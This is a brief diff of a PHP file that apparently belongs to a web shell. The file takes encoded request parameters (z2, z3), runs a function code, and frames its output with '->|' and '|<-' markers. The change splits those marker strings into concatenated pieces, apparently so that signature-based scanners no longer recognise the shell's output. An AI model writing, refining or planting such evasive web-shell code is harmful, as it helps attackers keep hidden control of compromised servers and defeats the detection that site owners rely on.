@@ -339,7 +339,7 @@ $z2 = decode(EC($_REQUEST['z2']));
 $z3 = decode(EC($_REQUEST['z3']));
 
 // echo "<meta HTTP-EQUIV=\"csontent-type\" content=\"text/html; charset={$cs}\">";
-echo "->|";
+echo "->"."|";
 $ret = "";
 try {
     switch ($funccode) {
@@ -402,5 +402,5 @@ try {
     $ret = "ERROR://".$e;
 }
 echo $ret;
-echo "|<-";
+echo "|"."<-";
 ?>
